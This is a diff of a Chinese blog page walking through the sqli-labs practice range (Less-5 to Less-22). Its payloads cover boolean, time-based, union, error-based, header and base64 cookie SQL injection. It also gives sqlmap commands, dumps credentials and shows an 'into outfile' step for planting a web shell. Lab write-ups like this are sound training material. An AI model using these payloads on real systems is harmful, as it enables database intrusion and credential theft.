 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>得到数据库用户名为root@localhost：</p>
-<img src="/posts/bb32/5_4.png" class>
+<img src="/posts/bb32/5_4.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="（3）下面采用的是基于布尔型的盲注："><a href="#（3）下面采用的是基于布尔型的盲注：" class="headerlink" title="（3）下面采用的是基于布尔型的盲注："></a>（3）下面采用的是基于布尔型的盲注：</h3><h3 id="5-1获取敏感信息"><a href="#5-1获取敏感信息" class="headerlink" title="5.1获取敏感信息"></a>5.1获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">构造payload:
 
 id<span class="token operator">=</span>1<span class="token string">' and if(substr(database(),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>将’a’可替换成其他字母，进行判断，如果正确会显示下图：</p>
-<img src="/posts/bb32/5_5.png" class>
+<img src="/posts/bb32/5_5.png" srcset="/img/loading.gif" lazyload class>
 
 <p>不正确则会显示下图：</p>
-<img src="/posts/bb32/5_6.png" class>
+<img src="/posts/bb32/5_6.png" srcset="/img/loading.gif" lazyload class>
 
 <p>根据对与错来判断输入字符的正确性。</p>
 <p>这里我采用抓包然后进行爆破，可得到数据库名为：security(写成大写也可以）</p>
-<img src="/posts/bb32/5_7.png" class>
+<img src="/posts/bb32/5_7.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="5-2获取表名"><a href="#5-2获取表名" class="headerlink" title="5.2获取表名"></a>5.2获取表名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 id<span class="token operator">=</span>1<span class="token string">' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>这里同样利用burp抓包，然后对标红的两个变量进行爆破，可得到表名为emails</p>
-<img src="/posts/bb32/5_8.png" class>
+<img src="/posts/bb32/5_8.png" srcset="/img/loading.gif" lazyload class>
 
 <p>并且将limit 0,1改成如limit 1,1可获取其他数据库，分别为referers,uagents,users</p>
 <h3 id="5-3获取字段名"><a href="#5-3获取字段名" class="headerlink" title="5.3获取字段名"></a>5.3获取字段名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：
@@ -373,7 +515,7 @@ id<span class="token operator">=</span>1<span class="token string">' and if(subs
 id<span class="token operator">=</span>1<span class="token string">' and if(substr((select column_name from information_schema.columns where table_name='</span><span class="token function">users</span><span class="token string">' limit 0,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>同样用burp抓包，得到字段名为user_id：</p>
-<img src="/posts/bb32/5_9.png" class>
+<img src="/posts/bb32/5_9.png" srcset="/img/loading.gif" lazyload class>
 
 <p>将limit 0,1改成其他行，可获得其他列名为username,password,等等。</p>
 <h3 id="5-4获取表里面的内容"><a href="#5-4获取表里面的内容" class="headerlink" title="5.4获取表里面的内容"></a>5.4获取表里面的内容</h3><pre class="line-numbers language-bash"><code class="language-bash">payload：
@@ -381,7 +523,7 @@ id<span class="token operator">=</span>1<span class="token string">' and if(subs
 id<span class="token operator">=</span>1<span class="token string">' and if(substr((select concat(username,0x3a,password) from users limit 0,1),1,1)='</span>a',1,0<span class="token punctuation">)</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>用burp抓包，得到用户名和密码为：dumb:dumb</p>
-<img src="/posts/bb32/5_10.png" class>
+<img src="/posts/bb32/5_10.png" srcset="/img/loading.gif" lazyload class>
 
 <h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>本关也为盲注。 通过输入单引号不报错，输入双引号报错，可推断源码中参数可能为 “$id”</p>
 <p>所以本关的解法跟Less-5一样，只需将第五关的单引号改成双引号即可。</p>
@@ -390,7 +532,7 @@ id<span class="token operator">=</span>1<span class="token string">' and if(subs
 <pre class="line-numbers language-bash"><code class="language-bash">id<span class="token operator">=</span>1'<span class="token punctuation">))</span> union <span class="token keyword">select</span> 1,2,3 into outfile  <span class="token string">"D:\\phpStudy\\PHPTutorial\\WWW\\sqli\\Less-7\\1.txt"</span>--+
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>虽然显示报错信息，但在路径下已经生成了1.txt</p>
-<img src="/posts/bb32/7.png" class>
+<img src="/posts/bb32/7.png" srcset="/img/loading.gif" lazyload class>
 
 <p>可以直接将一句话木马导入进去</p>
 <p>构造payload:</p>
@@ -399,7 +541,7 @@ id<span class="token operator">=</span>1<span class="token string">' and if(subs
 <p>然后可以利用工具连接。</p>
 <h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>通过测试，id=1’ or 1=1–+是显示正确的。这关跟第五关一样，可以使用基于布尔型的盲注，以及延时注入。但是不能使用报错注入。</p>
 <p>因为在源码中将将 mysql 报错的语句进行了注释。</p>
-<img src="/posts/bb32/8.png" class>
+<img src="/posts/bb32/8.png" srcset="/img/loading.gif" lazyload class>
 
 <p>其余的payload跟第五关的一样啦。</p>
 <h2 id="Less-9-基于时间的sql盲注（采用sqlmap）"><a href="#Less-9-基于时间的sql盲注（采用sqlmap）" class="headerlink" title="Less-9 基于时间的sql盲注（采用sqlmap）"></a>Less-9 基于时间的sql盲注（采用sqlmap）</h2><p>本关可采用时间延迟的注入。</p>
@@ -411,7 +553,7 @@ id<span class="token operator">=</span>1<span class="token string">' and if(subs
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>查看网络是否延时五秒，是则说明字符正确，不是则说明错误。</p>
 <p>将标红的1依次替换，可得到数据库名为security。</p>
-<img src="/posts/bb32/9.png" class>
+<img src="/posts/bb32/9.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="②获得表名"><a href="#②获得表名" class="headerlink" title="②获得表名"></a>②获得表名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
@@ -424,7 +566,7 @@ http://127.0.0.1:8099/sqli/Less-9/?id<span class="token operator">=</span>1<span
 sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=</span>1 -p <span class="token function">id</span> -v 1 --technique<span class="token operator">=</span>T
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>sqlmap检测到为时间注入：</p>
-<img src="/posts/bb32/9_2.png" class>
+<img src="/posts/bb32/9_2.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="9-2获取敏感信息"><a href="#9-2获取敏感信息" class="headerlink" title="9.2获取敏感信息"></a>9.2获取敏感信息</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
@@ -432,7 +574,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>(–current-user为获取用户，–current-db为获取数据库名， –batch表示使用自动模式，默认为y)</p>
 <p>获得当前数据库用户名为root@localhost，数据库名为：security</p>
-<img src="/posts/bb32/9_3.png" class>
+<img src="/posts/bb32/9_3.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="9-3获取表"><a href="#9-3获取表" class="headerlink" title="9.3获取表"></a>9.3获取表</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
@@ -440,7 +582,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>(-D 指定数据库 –tables 获取表)</p>
 <p>得到表名为emails,referers,uagents,users：</p>
-<img src="/posts/bb32/9_4.png" class>
+<img src="/posts/bb32/9_4.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="9-4获取字段"><a href="#9-4获取字段" class="headerlink" title="9.4获取字段"></a>9.4获取字段</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
@@ -448,7 +590,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>(–columns获取字段)</p>
 <p>得到字段名为id,username,password：</p>
-<img src="/posts/bb32/9_5.png" class>
+<img src="/posts/bb32/9_5.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="9-5查询账号和密码"><a href="#9-5查询账号和密码" class="headerlink" title="9.5查询账号和密码"></a>9.5查询账号和密码</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
@@ -456,7 +598,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>(–dump是导出数据，-C是指定查询的字段)</p>
 <p>得到账户密码为：</p>
-<img src="/posts/bb32/9_6.png" class>
+<img src="/posts/bb32/9_6.png" srcset="/img/loading.gif" lazyload class>
 
 <h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>本关跟第九关一样，只需将第九关的单引号换成双引号即可。</p>
 <h1 id="union联合注入（Less-11-Less-12-POST）"><a href="#union联合注入（Less-11-Less-12-POST）" class="headerlink" title="union联合注入（Less-11~Less-12 POST）"></a>union联合注入（Less-11~Less-12 POST）</h1><h3 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h3><p>不能使用–+注释符,因为抓包发现加号被编码成%2B了。</p>
@@ -472,14 +614,14 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>测试：1’ or 1=1#</p>
 <p>可以登录成功：</p>
-<img src="/posts/bb32/11.png" class>
+<img src="/posts/bb32/11.png" srcset="/img/loading.gif" lazyload class>
 
 <h3 id="11-1获取用户名"><a href="#11-1获取用户名" class="headerlink" title="11.1获取用户名"></a>11.1获取用户名</h3><p>①payload:</p>
 <p>在username的输入框输入：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">1' union <span class="token keyword">select</span> 1,user<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>得到当前数据库用户名为root@localhost:</p>
-<img src="/posts/bb32/11_2.png" class>
+<img src="/posts/bb32/11_2.png" srcset="/img/loading.gif" lazyload class>
 
 <p>或者：</p>
 <p>②payload：</p>
@@ -491,7 +633,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 <pre class="line-numbers language-bash"><code class="language-bash">1' union <span class="token keyword">select</span> 1,database<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>得到数据库名为security:</p>
-<img src="/posts/bb32/11_3.png" class>
+<img src="/posts/bb32/11_3.png" srcset="/img/loading.gif" lazyload class>
 
 <h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>通过测试，输入1”可以看到报错信息。</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">'"1"") and password=("") LIMIT 0,1'</span> at line 1
@@ -518,20 +660,20 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 1'</span><span class="token punctuation">)</span> or if<span class="token punctuation">((</span>select user<span class="token punctuation">(</span><span class="token punctuation">)</span> like <span class="token string">'r%'</span><span class="token punctuation">)</span>,1,0<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>用burp抓包，对标红的两个变量进行测试，爆破出当前用户名为root@localhost:</p>
-<img src="/posts/bb32/13.png" class>
+<img src="/posts/bb32/13.png" srcset="/img/loading.gif" lazyload class>
 
 <p>跟第五关的基于布尔型的盲注差不多。就不重复写了。</p>
 <h3 id="（2）可以采用报错注入"><a href="#（2）可以采用报错注入" class="headerlink" title="（2）可以采用报错注入"></a>（2）可以采用报错注入</h3><h4 id="①获取数据库名："><a href="#①获取数据库名：" class="headerlink" title="①获取数据库名："></a>①获取数据库名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：1'<span class="token punctuation">)</span> or info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <p>显示出了数据库名：</p>
-<img src="/posts/bb32/13_2.png" class>
+<img src="/posts/bb32/13_2.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="②获取当前数据库用户名："><a href="#②获取当前数据库用户名：" class="headerlink" title="②获取当前数据库用户名："></a>②获取当前数据库用户名：</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 1'<span class="token punctuation">)</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>得到用户名：</p>
-<img src="/posts/bb32/13_3.png" class>
+<img src="/posts/bb32/13_3.png" srcset="/img/loading.gif" lazyload class>
 
 <h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>输入1”，出现如下错误信息提示：</p>
 <pre class="line-numbers language-bash"><code class="language-bash"><span class="token string">'"1"" and password="" LIMIT 0,1'</span> at line 1
@@ -588,7 +730,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 
 1'</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/bb32/17.png" class>
+<img src="/posts/bb32/17.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="②猜测数据库名-2"><a href="#②猜测数据库名-2" class="headerlink" title="②猜测数据库名"></a>②猜测数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">1<span class="token string">' and extractvalue(1,concat(0x7e,(select database()),0x7e))#
 
@@ -596,14 +738,14 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 
 1'</span> or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/bb32/17_2.png" class>
+<img src="/posts/bb32/17_2.png" srcset="/img/loading.gif" lazyload class>
 
 <h1 id="HTTP头部插入-Less-18-Less22"><a href="#HTTP头部插入-Less-18-Less22" class="headerlink" title="HTTP头部插入(Less-18~Less22)"></a>HTTP头部插入(Less-18~Less22)</h1><h2 id="Less-18-基于错误的用户代理，头部POST注入"><a href="#Less-18-基于错误的用户代理，头部POST注入" class="headerlink" title="Less-18 基于错误的用户代理，头部POST注入"></a>Less-18 基于错误的用户代理，头部POST注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p>
-<img src="/posts/bb32/18.png" class>
+<img src="/posts/bb32/18.png" srcset="/img/loading.gif" lazyload class>
 
 <p>可以抓包修改User-Agent的内容试试：</p>
 <p>将User-Agent里面的内容随便填写，可以看到显示出了我们输入的内容：</p>
-<img src="/posts/bb32/18_2.png" class>
+<img src="/posts/bb32/18_2.png" srcset="/img/loading.gif" lazyload class>
 
 <p>此时可以在User-Agent中构造注入语句。</p>
 <h3 id="利用报错注入："><a href="#利用报错注入：" class="headerlink" title="利用报错注入："></a>利用报错注入：</h3><h4 id="①获得数据库用户名"><a href="#①获得数据库用户名" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
@@ -614,7 +756,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 
 1<span class="token string">' or extractvalue(1,concat(0x7e,(select user()),0x7e)) and '</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/bb32/18_3.png" class> 
+<img src="/posts/bb32/18_3.png" srcset="/img/loading.gif" lazyload class> 
 
 <h4 id="②获得数据库名"><a href="#②获得数据库名" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
@@ -624,14 +766,14 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 
 1<span class="token string">' or extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/bb32/18_4.png" class>
+<img src="/posts/bb32/18_4.png" srcset="/img/loading.gif" lazyload class>
 
 <h2 id="Less-19-基于头部的Referer-POST报错注入"><a href="#Less-19-基于头部的Referer-POST报错注入" class="headerlink" title="Less-19 基于头部的Referer POST报错注入"></a>Less-19 基于头部的Referer POST报错注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p>
-<img src="/posts/bb32/19.png" class>
+<img src="/posts/bb32/19.png" srcset="/img/loading.gif" lazyload class>
 
 <p>这题的思路跟第十八关差不多，只是将User-Agent换成Referer。</p>
 <p>用burp抓包，修改一下Referer的内容看看：</p>
-<img src="/posts/bb32/19_2.png" class>
+<img src="/posts/bb32/19_2.png" srcset="/img/loading.gif" lazyload class>
 
 <p>的确显示为被修改的内容了，然后在Referer中构造注入语句。</p>
 <h4 id="①获得数据库用户名-1"><a href="#①获得数据库用户名-1" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
@@ -642,7 +784,7 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 
 1<span class="token string">' or extractvalue(1,concat(0x7e,(select user()),0x7e)) and '</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/bb32/19_3.png" class>
+<img src="/posts/bb32/19_3.png" srcset="/img/loading.gif" lazyload class>
 
 <p>②获得数据库名</p>
 <pre class="line-numbers language-bash"><code class="language-bash">payload：
@@ -653,31 +795,31 @@ sqlmap -u http://121.5.52.144/sqli/sqli/Less-9/?id<span class="token operator">=
 
 1<span class="token string">' or extractvalue(1,concat(0x7e,(select database()),0x7e)) and '</span>1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/bb32/19_4.png" class> 
+<img src="/posts/bb32/19_4.png" srcset="/img/loading.gif" lazyload class> 
 
 <h2 id="Less-20-基于错误的cookie头部POST注入"><a href="#Less-20-基于错误的cookie头部POST注入" class="headerlink" title="Less-20 基于错误的cookie头部POST注入"></a>Less-20 基于错误的cookie头部POST注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p>
-<img src="/posts/bb32/20.png" class>
+<img src="/posts/bb32/20.png" srcset="/img/loading.gif" lazyload class>
 
 <p>可以考虑在cookie中添加注入语句。</p>
 <p>Burp抓包：</p>
 <p>因为是cookie，之前没有登录过，所以没有值，我们将请求发送给自己，然后可以获得cookie值：</p>
-<img src="/posts/bb32/20_2.png" class>
+<img src="/posts/bb32/20_2.png" srcset="/img/loading.gif" lazyload class>
 
 <p>点击两次发送，能获得cookie值，然后发送到重发器，再从里面添加注入语句。</p>
 <h3 id="①获得数据库用户名-2"><a href="#①获得数据库用户名-2" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h3><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 uname<span class="token operator">=</span>Dumb' or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select user<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/bb32/20_3.png" class>
+<img src="/posts/bb32/20_3.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="②获得数据库名-1"><a href="#②获得数据库名-1" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
 uname<span class="token operator">=</span>Dumb' or <span class="token punctuation">(</span>updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">))</span><span class="token comment" spellcheck="true">#</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/bb32/20_4.png" class>
+<img src="/posts/bb32/20_4.png" srcset="/img/loading.gif" lazyload class>
 
 <h2 id="Less-21-基于错误的复杂的字符型Cookie注入"><a href="#Less-21-基于错误的复杂的字符型Cookie注入" class="headerlink" title="Less-21  基于错误的复杂的字符型Cookie注入"></a>Less-21  基于错误的复杂的字符型Cookie注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p>
-<img src="/posts/bb32/21.png" class>
+<img src="/posts/bb32/21.png" srcset="/img/loading.gif" lazyload class>
 
 <p>跟第二十关差不多，只是将账号用base64加密了。并且只是对uname是进行了(‘uname’)的处理。</p>
 <h4 id="①获得数据库用户名-3"><a href="#①获得数据库用户名-3" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
@@ -688,7 +830,7 @@ uname<span class="token operator">=</span>Dumb'<span class="token punctuation">)
 
 uname<span class="token operator">=</span>RHVtYicpIG9yICh1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IHVzZXIoKSksMHg3ZSksMSkpIw<span class="token operator">==</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/bb32/21_2.png" class>
+<img src="/posts/bb32/21_2.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="②获得数据库名-2"><a href="#②获得数据库名-2" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
@@ -698,10 +840,10 @@ uname<span class="token operator">=</span>Dumb'<span class="token punctuation">)
 
 uname<span class="token operator">=</span>RHVtYicpIG9yICh1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGRhdGFiYXNlKCkpLDB4N2UpLDEpKSM<span class="token operator">=</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/bb32/21_3.png" class>
+<img src="/posts/bb32/21_3.png" srcset="/img/loading.gif" lazyload class>
 
 <h2 id="Less-22-基于错误的双引号字符型Cookie注入"><a href="#Less-22-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 基于错误的双引号字符型Cookie注入"></a>Less-22 基于错误的双引号字符型Cookie注入</h2><p>当输入正确的账号和密码时，比如账号dumb，密码dumb，可以看到出现如下信息：</p>
-<img src="/posts/bb32/22.png" class>
+<img src="/posts/bb32/22.png" srcset="/img/loading.gif" lazyload class>
 
 <p>跟第二十关差不多，将账号用base64加密了，并且是对uname是进行了”uname”的处理。</p>
 <h4 id="①获得数据库用户名-4"><a href="#①获得数据库用户名-4" class="headerlink" title="①获得数据库用户名"></a>①获得数据库用户名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload：
@@ -712,7 +854,7 @@ uname<span class="token operator">=</span>Dumb" or <span class="token punctuatio
 
 uname<span class="token operator">=</span>RHVtYiIgb3IgKHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgdXNlcigpKSwweDdlKSwxKSkj
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/bb32/22_2.png" class>
+<img src="/posts/bb32/22_2.png" srcset="/img/loading.gif" lazyload class>
 
 <h4 id="②获得数据库名-3"><a href="#②获得数据库名-3" class="headerlink" title="②获得数据库名"></a>②获得数据库名</h4><pre class="line-numbers language-bash"><code class="language-bash">payload:
 
@@ -722,5 +864,247 @@ uname<span class="token operator">=</span>Dumb" or <span class="token punctuatio
 
 uname<span class="token operator">=</span>dW5hbWU9RHVtYiIgb3IgKHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgZGF0YWJhc2UoKSksMHg3ZSksMSkpIw<span class="token operator">==</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<img src="/posts/bb32/22_3.png" class>
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://echozt.github.io">echozt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://echozt.github.io/posts/bb32.html">https://echozt.github.io/posts/bb32.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://echozt.github.io" target="_blank">echozt</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a><a class="post-meta__tags" href="/tags/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post-share"><div class="social-share" data-image="/img/featureimages/5.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="prev-post pull-left" href="/posts/fb8a.html" title="sqli靶场(23~37关)"><img class="cover" src="/img/featureimages/1.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">sqli靶场(23~37关)</div></div></a><a class="next-post pull-right" href="/posts/1702.html" title="upload文件上传靶场"><img class="cover" src="/img/featureimages/4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">upload文件上传靶场</div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a href="/posts/fb8a.html" title="sqli靶场(23~37关)"><img class="cover" src="/img/featureimages/1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-10</div><div class="title">sqli靶场(23~37关)</div></div></a><a href="/posts/1d0a.html" title="bodgeit靶场"><img class="cover" src="/img/featureimages/6.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-02-26</div><div class="title">bodgeit靶场</div></div></a><a href="/posts/8409.html" title="dvwa靶场"><img class="cover" src="/img/featureimages/6.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-07</div><div class="title">dvwa靶场</div></div></a><a href="/posts/6011.html" title="pikachu靶场"><img class="cover" src="/img/featureimages/6.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-23</div><div class="title">pikachu靶场</div></div></a><a href="/posts/7e37.html" title="sqli靶场(38~53关)"><img class="cover" src="/img/featureimages/6.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-11</div><div class="title">sqli靶场(38~53关)</div></div></a><a href="/posts/b894.html" title="sqli靶场(54~65关)"><img class="cover" src="/img/featureimages/1.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt 